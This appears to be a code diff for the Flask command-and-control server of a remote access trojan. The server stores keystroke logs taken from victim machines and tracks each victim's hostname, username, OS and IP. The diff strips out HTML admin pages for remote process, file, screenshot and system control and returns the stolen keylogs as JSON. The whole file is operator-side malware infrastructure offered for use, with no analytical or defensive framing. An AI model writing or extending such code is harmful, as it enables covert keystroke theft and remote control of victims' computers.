@@ -1,4 +1,4 @@
-from flask import Flask, request, jsonify, render_template
+from flask import Flask, request, jsonify
 import time
 import threading
 from datetime import datetime
@@ -439,60 +439,29 @@ def receive_keylog_data():
 @app.route("/admin/keylogs/<client_id>", methods=["GET"])
 def get_client_keylogs(client_id):
     try:
-        # Check if request wants JSON (API call)
-        if request.args.get('format') == 'json':
-            limit = request.args.get('limit', 100, type=int)
-            
-            if client_id in keylogs_storage:
-                logs = keylogs_storage[client_id][-limit:]
-                return jsonify({
-                    "success": True,
-                    "client_id": client_id,
-                    "keylogs": logs,
-                    "total_logs": len(keylogs_storage[client_id]),
-                    "returned_logs": len(logs)
-                })
-            else:
-                return jsonify({
-                    "success": True,
-                    "client_id": client_id,
-                    "keylogs": [],
-                    "total_logs": 0,
-                    "message": "No keylogs found for this client"
-                })
+        limit = request.args.get('limit', 100, type=int)
         
-        # Default: Return HTML interface
-        limit = request.args.get('limit', 500, type=int)
-        
-        # Get client info
-        client_info = clients.get(client_id, {})
-        system_info = client_info.get('system_info', {})
-        hostname = system_info.get('hostname', 'Unknown')
-        username = system_info.get('username', 'Unknown')
-        os_name = system_info.get('os', 'Unknown')
-        
-        # Get keylogs
-        logs = []
-        total_logs = 0
         if client_id in keylogs_storage:
-            total_logs = len(keylogs_storage[client_id])
             logs = keylogs_storage[client_id][-limit:]
-        
-        # Check if client is online
-        is_online = client_id in clients and (time.time() - client_info.get('last_seen', 0) < 60)
-        
-        return render_template('keylogs_viewer.html',
-                             client_id=client_id,
-                             hostname=hostname,
-                             username=username,
-                             os_name=os_name,
-                             is_online=is_online,
-                             total_logs=total_logs,
-                             logs=logs)
+            return jsonify({
+                "success": True,
+                "client_id": client_id,
+                "keylogs": logs,
+                "total_logs": len(keylogs_storage[client_id]),
+                "returned_logs": len(logs)
+            })
+        else:
+            return jsonify({
+                "success": True,
+                "client_id": client_id,
+                "keylogs": [],
+                "total_logs": 0,
+                "message": "No keylogs found for this client"
+            })
     
     except Exception as e:
         print(f"[ADMIN_KEYLOG] Error getting keylogs for {client_id}: {e}")
-        return f"<h1>Error</h1><p>Failed to load keylogs: {e}</p>", 500
+        return jsonify({"error": f"Failed to get keylogs: {e}"}), 500
 
 
 @app.route("/admin/keylogs_stats", methods=["GET"])
@@ -518,130 +487,6 @@ def get_keylogs_stats():
     
     except Exception as e:
         return jsonify({"error": f"Failed to get keylog stats: {e}"}), 500
-
-
-# Jinja2 custom filters
-@app.template_filter('format_uptime')
-def format_uptime(seconds):
-    hours = int(seconds // 3600)
-    minutes = int((seconds % 3600) // 60)
-    secs = int(seconds % 60)
-    return f"{hours}h {minutes}m {secs}s"
-
-
-# Web Interface Endpoints
-@app.route('/admin/dashboard', methods=['GET'])
-def dashboard():
-    try:
-        clients_list = []
-        current_time = time.time()
-        
-        for client_id, client_data in clients.items():
-            last_seen = client_data.get('last_seen', 0)
-            clients_list.append({
-                "client_id": client_id,
-                "system_info": client_data.get('system_info', {}),
-                "first_seen": client_data.get('first_seen'),
-                "last_seen": last_seen,
-                "ip": client_data.get('ip'),
-                "online": current_time - last_seen < 10,
-                "checkin_count": client_data.get('checkin_count', 0),
-                "uptime_seconds": current_time - client_data.get('first_seen', current_time)
-            })
-        
-        online_count = sum(1 for c in clients_list if c['online'])
-        
-        return render_template('dashboard.html',
-                             clients=clients_list,
-                             total_clients=len(clients_list),
-                             online_clients=online_count)
-    except Exception as e:
-        return f"<h1>Error</h1><p>{e}</p>", 500
-
-
-@app.route('/admin/processes/<client_id>', methods=['GET'])
-def process_manager(client_id):
-    try:
-        client_info = clients.get(client_id, {})
-        system_info = client_info.get('system_info', {})
-        hostname = system_info.get('hostname', 'Unknown')
-        username = system_info.get('username', 'Unknown')
-        is_online = client_id in clients and (time.time() - client_info.get('last_seen', 0) < 60)
-        
-        return render_template('process_manager.html',
-                             client_id=client_id,
-                             hostname=hostname,
-                             username=username,
-                             is_online=is_online)
-    except Exception as e:
-        return f"<h1>Error</h1><p>{e}</p>", 500
-
-
-@app.route('/admin/files/<client_id>', methods=['GET'])
-def file_manager(client_id):
-    try:
-        client_info = clients.get(client_id, {})
-        system_info = client_info.get('system_info', {})
-        hostname = system_info.get('hostname', 'Unknown')
-        username = system_info.get('username', 'Unknown')
-        is_online = client_id in clients and (time.time() - client_info.get('last_seen', 0) < 60)
-        
-        return render_template('file_manager.html',
-                             client_id=client_id,
-                             hostname=hostname,
-                             username=username,
-                             is_online=is_online)
-    except Exception as e:
-        return f"<h1>Error</h1><p>{e}</p>", 500
-
-
-@app.route('/admin/screenshot/<client_id>', methods=['GET'])
-def screenshot_manager(client_id):
-    try:
-        client_info = clients.get(client_id, {})
-        system_info = client_info.get('system_info', {})
-        hostname = system_info.get('hostname', 'Unknown')
-        username = system_info.get('username', 'Unknown')
-        is_online = client_id in clients and (time.time() - client_info.get('last_seen', 0) < 60)
-        
-        return render_template('screenshot.html',
-                             client_id=client_id,
-                             hostname=hostname,
-                             username=username,
-                             is_online=is_online)
-    except Exception as e:
-        return f"<h1>Error</h1><p>{e}</p>", 500
-
-
-@app.route('/admin/system/<client_id>', methods=['GET'])
-def system_info(client_id):
-    try:
-        client_info = clients.get(client_id, {})
-        system_info = client_info.get('system_info', {})
-        hostname = system_info.get('hostname', 'Unknown')
-        username = system_info.get('username', 'Unknown')
-        is_online = client_id in clients and (time.time() - client_info.get('last_seen', 0) < 60)
-        
-        return render_template('system_info.html',
-                             client_id=client_id,
-                             hostname=hostname,
-                             username=username,
-                             is_online=is_online)
-    except Exception as e:
-        return f"<h1>Error</h1><p>{e}</p>", 500
-
-
-@app.route('/admin/debug/<client_id>', methods=['GET'])
-def debug_panel(client_id):
-    try:
-        client_info = clients.get(client_id, {})
-        is_online = client_id in clients and (time.time() - client_info.get('last_seen', 0) < 60)
-        
-        return render_template('debug.html',
-                             client_id=client_id,
-                             is_online=is_online)
-    except Exception as e:
-        return f"<h1>Error</h1><p>{e}</p>", 500
 
 
 @app.before_request
